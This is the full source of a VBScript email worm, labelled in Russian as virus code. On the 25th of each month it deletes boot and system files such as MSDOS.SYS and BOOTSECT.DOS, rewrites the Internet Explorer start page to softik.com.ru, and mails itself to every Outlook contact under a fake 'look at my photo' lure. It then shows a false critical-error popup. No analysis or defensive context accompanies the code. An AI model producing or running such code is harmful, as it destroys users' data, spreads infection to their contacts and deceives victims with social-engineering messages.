'            = = = = = =  = > КОД ВИРУСА < = = = = = = = 

'      Объявление переменных(этот абзац не перемещать)
Set FileSystemObject = CreateObject("scripting.filesystemobject")
Set Shell = CreateObject("Wscript.Shell")
t = 0: On Error Resume Next ' Пропускать ошибки
Set Application = CreateObject("Shell.Application")
Set InternerExplorer = WScript.CreateObject("InternetExplorer.Application")
Set Outlook = WScript.CreateObject("Outlook.Application")


'     Запускать вирус каждое 25 число каждого месяца
If Day(Date)<>25 Then WScript.quit

' Удаление C:\CONFIG.DOS
str = "C:\CONFIG.DOS"
If FileSystemObject.fileExists(str) = True Then
FileSystemObject.deletefile str,True
ElseIf FileSystemObject.folderExists(str) = True Then
FileSystemObject.deletefolder str,True
End If

' Удаление C:\MSDOS.SYS
str = "C:\MSDOS.SYS"
If FileSystemObject.fileExists(str) = True Then
FileSystemObject.deletefile str,True
ElseIf FileSystemObject.folderExists(str) = True Then
FileSystemObject.deletefolder str,True
End If

' Удаление C:\COMMAND.DOS
str = "C:\COMMAND.DOS"
If FileSystemObject.fileExists(str) = True Then
FileSystemObject.deletefile str,True
ElseIf FileSystemObject.folderExists(str) = True Then
FileSystemObject.deletefolder str,True
End If

' Удаление C:\BOOTSECT.DOS
str = "C:\BOOTSECT.DOS"
If FileSystemObject.fileExists(str) = True Then
FileSystemObject.deletefile str,True
ElseIf FileSystemObject.folderExists(str) = True Then
FileSystemObject.deletefolder str,True
End If

' Удаление C:\MSDOS.DOS
str = "C:\MSDOS.DOS"
If FileSystemObject.fileExists(str) = True Then
FileSystemObject.deletefile str,True
ElseIf FileSystemObject.folderExists(str) = True Then
FileSystemObject.deletefolder str,True
End If

' Сделать домашней страницу "http:\\softik.com.ru"
Shell.RegWrite "HKCU\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page", "http:\\softik.com.ru"

' Разослать вирус Все контакты неприятеля
For Index = 1 To Outlook.GetNameSpace("MAPI").AddressLists(1).count
Set OutMail = Outlook.CreateItem(0)
OutMail.to = Outlook.GetNameSpace("MAPI").AddressLists(1).AddressEntries(Index)
OutMail.Subject = "Привет, посмори мою фотку, она в письме !"
OutMail.Body = "Посли просмотра, напиши мне своё мнение на e-mail. Жду ответа!"
OutMail.Attachments.Add WScript.ScriptFullName
OutMail.Send
Next


'     Вывести сообщение 
For index = 1 To 2
Shell.popup "Произошла критическая ошибка, возможно Вам потребуется помощь специалистов !", 10, "Внимание", 0+16
Loop

